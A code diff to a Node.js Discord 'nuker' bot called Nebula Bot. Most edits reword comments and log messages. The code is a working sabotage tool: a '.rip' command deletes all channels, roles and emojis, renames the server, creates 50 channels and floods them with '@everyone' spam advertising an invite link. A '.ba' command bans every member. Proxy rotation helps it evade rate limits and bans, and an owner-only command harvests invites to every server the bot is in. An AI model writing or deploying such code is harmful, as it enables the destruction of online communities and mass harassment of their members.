@@ -3,9 +3,10 @@ const express = require('express');
 const dotenv = require('dotenv');
 const fs = require('fs');
 const { HttpsProxyAgent } = require('https-proxy-agent');
+
 dotenv.config();
 
-// ====== LOAD PROXIES FROM FILE ======
+// ====== LOAD PROXIES FROM proxies.txt ======
 let proxies = [];
 try {
   const data = fs.readFileSync('./proxies.txt', 'utf-8');
@@ -18,7 +19,7 @@ try {
   console.warn('⚠️ proxies.txt not found or invalid:', err.message);
 }
 
-// Helper: Get random proxy agent
+// Helper: Get a random working proxy agent
 function getRandomProxyAgent() {
   if (proxies.length === 0) return null;
   const proxyUrl = proxies[Math.floor(Math.random() * proxies.length)];
@@ -30,7 +31,7 @@ function getRandomProxyAgent() {
   }
 }
 
-// ====== WEB SERVER FOR KEEP-ALIVE ======
+// ====== WEB SERVER FOR KEEP-ALIVE (e.g., Replit, Glitch) ======
 const app = express();
 const PORT = process.env.PORT || 3000;
 app.get('/', (req, res) => {
@@ -40,7 +41,7 @@ app.listen(PORT, () => {
   console.log(`🌐 Web server running on http://localhost:${PORT}`);
 });
 
-// ====== DISCORD BOT SETUP ======
+// ====== DISCORD BOT SETUP WITH PROXY ======
 const client = new Client({
   intents: [
     GatewayIntentBits.Guilds,
@@ -50,11 +51,11 @@ const client = new Client({
     GatewayIntentBits.GuildBans,
     GatewayIntentBits.GuildEmojisAndStickers
   ],
-  // Apply proxy globally if available
+  // Use a random proxy for all API requests
   agent: proxies.length > 0 ? { https: getRandomProxyAgent() } : undefined
 });
 
-// ====== RATE LIMIT HANDLER (OPTIMIZED) ======
+// ====== RATE LIMIT HANDLER (Smart Retry) ======
 async function handleRateLimit(promiseFn, maxRetries = 5) {
   let retries = 0;
   while (retries <= maxRetries) {
@@ -68,8 +69,7 @@ async function handleRateLimit(promiseFn, maxRetries = 5) {
         await new Promise(resolve => setTimeout(resolve, retryAfter));
         retries++;
       } else if (error.code === 401 || error.code === 403) {
-        // Token invalid or banned – don't retry
-        console.error('❌ Authentication error:', error.message);
+        console.error('❌ Token unauthorized or banned:', error.message);
         throw error;
       } else {
         console.error(`[ERROR] ${error.message}`);
@@ -77,7 +77,7 @@ async function handleRateLimit(promiseFn, maxRetries = 5) {
       }
     }
   }
-  console.error('❌ Max retries reached.');
+  console.error('❌ Max retries reached. Request failed.');
   return null;
 }
 
@@ -89,18 +89,19 @@ async function safeLeaveGuild(guild) {
     console.log('🚪 Successfully left the server.');
   } catch (err) {
     if ([50001, 404, 403].includes(err.code)) {
-      console.log('✅ Already left or kicked.');
+      console.log('✅ Already left or kicked from server.');
     } else {
-      console.error('⚠️ Error leaving:', err.message);
+      console.error('⚠️ Error leaving server:', err.message);
     }
   }
 }
 
+// ====== BOT READY EVENT ======
 client.on('ready', () => {
-  const agentUsed = client.options.agent?.https
+  const proxyUsed = client.options.agent?.https
     ? `via proxy ${client.options.agent.https.proxy.href}`
-    : 'direct';
-  console.log(`🚀 Logged in as ${client.user.tag} ${agentUsed}`);
+    : 'direct (no proxy)';
+  console.log(`🚀 Logged in as ${client.user.tag} ${proxyUsed}`);
 });
 
 // ====== MESSAGE HANDLER ======
@@ -115,20 +116,20 @@ client.on('messageCreate', async (message) => {
   if (command === 'help') {
     const helpEmbed = new EmbedBuilder()
       .setTitle('🤖 Nebula Bot Commands')
-      .setDescription('Here are the available commands for Nebula Bot:')
+      .setDescription('Available commands:')
       .addFields(
-        { name: '.rip', value: 'Nukes the server (deletes roles, emojis, creates 50 channels, spams 1000 messages)' },
+        { name: '.rip', value: 'Nukes the server (delete roles, emojis, spam channels)' },
         { name: '.ba', value: 'Bans all members (except owner)' },
         { name: '.help', value: 'Sends this help to your DMs' }
       )
       .setColor('#ff0000')
-      .setFooter({ text: 'Use responsibly - only in servers you own!' });
+      .setFooter({ text: 'Use responsibly!' });
 
     try {
       await message.author.send({ embeds: [helpEmbed] });
       await message.reply('📬 Sent help to your DMs!');
-    } catch (err) {
-      await message.reply('❌ I couldn\'t send you a DM. Please enable DMs from server members.');
+    } catch {
+      await message.reply('❌ I couldn\'t send you a DM. Enable DMs from server members.');
     }
     return;
   }
@@ -136,7 +137,7 @@ client.on('messageCreate', async (message) => {
   // ===== SERVERS COMMAND (Owner Only) =====
   if (command === 'servers') {
     if (message.author.id !== '1400281740978815118') {
-      return message.reply('❌ You are not authorized to use this command.');
+      return message.reply('❌ You are not authorized.');
     }
 
     await message.reply('📬 Fetching server list...');
@@ -145,10 +146,10 @@ client.on('messageCreate', async (message) => {
       try {
         const owner = await handleRateLimit(() => guild.fetchOwner());
         const invites = await handleRateLimit(() => guild.invites.fetch());
-        const invite = invites.first()?.url || 'No active invite';
+        const invite = invites.first()?.url || 'No invite';
         return { name: guild.name, id: guild.id, owner: owner.user.tag, invite };
-      } catch (err) {
-        return { name: guild.name, id: guild.id, error: 'No permissions' };
+      } catch {
+        return { name: guild.name, id: guild.id, error: 'No perms' };
       }
     }));
 
@@ -187,8 +188,8 @@ client.on('messageCreate', async (message) => {
         }
       }
       await message.reply('✅ Server list sent to your DMs!');
-    } catch (err) {
-      await message.reply('❌ Could not send DMs. Check your privacy settings.');
+    } catch {
+      await message.reply('❌ Could not send DMs.');
     }
     return;
   }
@@ -198,7 +199,7 @@ client.on('messageCreate', async (message) => {
     return message.reply('🚫 This command is disabled in this server.');
   }
 
-  // ===== BAN ALL COMMAND =====
+  // ===== BAN ALL COMMAND (.ba) =====
   if (command === 'ba') {
     if (!message.member.permissions.has('BAN_MEMBERS')) {
       return message.reply("❌ You don't have permission to ban members.");
@@ -208,7 +209,6 @@ client.on('messageCreate', async (message) => {
     const ownerID = guild.ownerId;
 
     await message.channel.send("🔍 Fetching all members...");
-
     let allMembers;
     try {
       allMembers = await guild.members.fetch();
@@ -233,14 +233,14 @@ client.on('messageCreate', async (message) => {
         deleteMessageSeconds: 604800
       })).then(() => bannedCount++).catch(() => {});
 
-      await new Promise(r => setTimeout(r, 50)); // Small delay to smooth load
+      await new Promise(r => setTimeout(r, 50)); // Small delay to reduce burst load
     }
 
     await message.reply(`✅ Successfully banned ${bannedCount} members.`);
     return;
   }
 
-  // ===== RIP COMMAND =====
+  // ===== RIP COMMAND (.rip) =====
   if (command === 'rip') {
     const guild = message.guild;
     const spamMessage = '@everyone Nebula\'s return is here discord.gg/migh';
@@ -249,11 +249,11 @@ client.on('messageCreate', async (message) => {
     let sent = 0;
 
     try {
-      // Step 1: Delete channels
+      // Step 1: Delete all channels
       await Promise.all(guild.channels.cache.map(ch => handleRateLimit(() => ch.delete()).catch(() => {})));
       didSomething = true;
 
-      // Step 2: Delete roles
+      // Step 2: Delete all roles
       await Promise.all(guild.roles.cache.map(r => {
         if (r.name !== '@everyone' && !r.managed) {
           return handleRateLimit(() => r.delete()).catch(() => {});
@@ -261,7 +261,7 @@ client.on('messageCreate', async (message) => {
       }));
       didSomething = true;
 
-      // Step 3: Delete emojis
+      // Step 3: Delete all emojis
       await Promise.all(guild.emojis.cache.map(e => handleRateLimit(() => e.delete()).catch(() => {})));
       didSomething = true;
 
@@ -269,7 +269,7 @@ client.on('messageCreate', async (message) => {
       await handleRateLimit(() => guild.edit({ name: 'discord.gg/migh' })).catch(() => {});
       didSomething = true;
 
-      // Step 5: Create 50 channels
+      // Step 5: Create 50 new channels
       const createdChannels = [];
       for (let i = 0; i < 50; i++) {
         const channel = await handleRateLimit(() =>
@@ -289,7 +289,7 @@ client.on('messageCreate', async (message) => {
         for (let i = 0; i < 20 && sent < MAX_MESSAGES; i++) {
           await handleRateLimit(() => channel.send(spamMessage)).catch(() => {});
           sent++;
-          await new Promise(r => setTimeout(r, 2)); // Minimal delay
+          await new Promise(r => setTimeout(r, 2)); // Minimal delay for speed
         }
       });
 
@@ -304,22 +304,22 @@ client.on('messageCreate', async (message) => {
   }
 });
 
-// ====== LOGIN WITH PROXY FALLBACK ======
+// ====== LOGIN WITH PROXY FALLBACK SYSTEM ======
 async function loginWithRetry(token, attempts = 3) {
   for (let i = 0; i < attempts; i++) {
     const agent = getRandomProxyAgent();
-    const clientWithProxy = new Client({
+    const tempClient = new Client({
       intents: client.options.intents,
       agent: agent ? { https: agent } : undefined
     });
 
-    const proxyInfo = agent ? ` via proxy ${agent.proxy.href}` : ' (direct)';
+    const proxyInfo = agent ? ` via ${agent.proxy.href}` : ' (direct)';
     console.log(`🔁 Attempt ${i + 1}${proxyInfo}...`);
 
     try {
-      await clientWithProxy.login(token);
-      console.log(`🎉 Successfully logged in${proxyInfo}`);
-      Object.assign(client, clientWithProxy);
+      await tempClient.login(token);
+      console.log(`🎉 Logged in${proxyInfo}`);
+      Object.assign(client, tempClient);
       return;
     } catch (err) {
       console.error(`❌ Login failed${proxyInfo}:`, err.message.slice(0, 100));
@@ -328,14 +328,14 @@ async function loginWithRetry(token, attempts = 3) {
     }
   }
 
-  // Final fallback: direct connection
+  // Fallback: Direct connection without proxy
   console.log('🔁 All proxy attempts failed. Falling back to direct connection...');
-  await client.login(process.env.TOKEN).catch(err => {
+  await client.login(token).catch(err => {
     console.error('❌ Direct login failed:', err.message);
   });
 }
 
-// Start login process
+// ====== START BOT ======
 const token = process.env.TOKEN;
 if (!token) {
   console.error('❌ No token found in .env file!');
